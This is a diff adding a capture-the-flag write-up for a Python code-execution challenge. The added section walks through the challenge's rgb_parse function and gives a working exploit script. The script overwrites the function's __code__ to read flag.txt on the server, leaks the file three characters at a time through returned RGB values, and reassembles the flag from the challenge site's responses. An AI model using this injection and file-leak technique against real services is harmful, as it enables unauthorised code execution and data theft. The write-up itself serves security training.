@@ -111,3 +111,84 @@ We are also given `parse.py` which contains the `rgb_parse()` function. Let us t
 
 parse.py
 
+```py
+import sys
+
+if "random" not in dir():
+   import random
+
+def rgb_parse(inp=""):
+   inp = str(inp)
+   randomizer = random.randint(100, 1000)
+   total = 0
+   for n in inp:
+      n = ord(n)
+      total += n+random.randint(1, 10)
+   rgb = total*randomizer*random.randint(100, 1000)
+   rgb = str(rgb%1000000000)
+   r = int(rgb[0:3]) + 29
+   g = int(rgb[3:6]) + random.randint(10, 100)
+   b = int(rgb[6:9]) + 49
+   r, g, b = r%256, g%256, b%256
+   return r, g, b
+```
+
+The function `rgb_parse()` takes an input `inp` (which is the output of our `main()`) and then by manipulating it generates a random rgb color value. This is then set in `index.html`.
+
+## Exploit
+
+I had already tried sending the exploit by using `curl`, `requests` etc. but it would not work due to the timeout. Another approach was that we could create our own `random.py` file and then implement our own `randint` function so that the rgb values won't be random anymore and then it would be possible to guess the flag using the rgb values. But this exploit only worked locally for me (no idea why it didn't work on the server).
+
+Finally this is what worked.
+
+```py
+def main():
+    from parse import rgb_parse
+    def new(text):
+        with open("flag.txt", "r") as f:
+            flag = f.read()
+            return ord(flag[0]), ord(flag[1]), ord(flag[2])
+    rgb_parse.__code__ = new.__code__
+    return "code"
+from parse import rgb_parse
+print(rgb_parse(main()))
+```
+
+`rgb_parse.__code__ = new.__code__` modifies the `rgb_parse` funciton to our `new` that we defined. With this we could find all the characters of the flag using the rgb values.
+
+exploit.py
+
+```py
+import requests
+
+baseURL = 'http://p2c.chal.imaginaryctf.org/'
+def pythonCode(code):
+    url = baseURL
+    sendData = {"code": code}
+    r = requests.post(url, data=sendData)
+    return r
+
+flag = ""
+for i in range(0, 33, 3):
+
+    exploit = f"""
+from parse import rgb_parse
+def new(text):
+    with open("flag.txt", "r") as f:
+        flag = f.read()
+        return ord(flag[{i}]), ord(flag[{i+1}]), ord(flag[{i+2}])
+rgb_parse.__code__ = new.__code__
+return "code"
+"""
+    res = pythonCode(exploit).text
+    res = res.split('changeBackgroundColor("rgb')
+    res = res[1]
+    res = res.split('");')
+    res = eval(res[0])
+    flag += chr(res[0]) + chr(res[1]) + chr(res[2])
+    print(flag)
+
+print(flag)
+```
+
+Running this gives our flag `ictf{d1_color_picker_fr_2ce0dd3d}`.
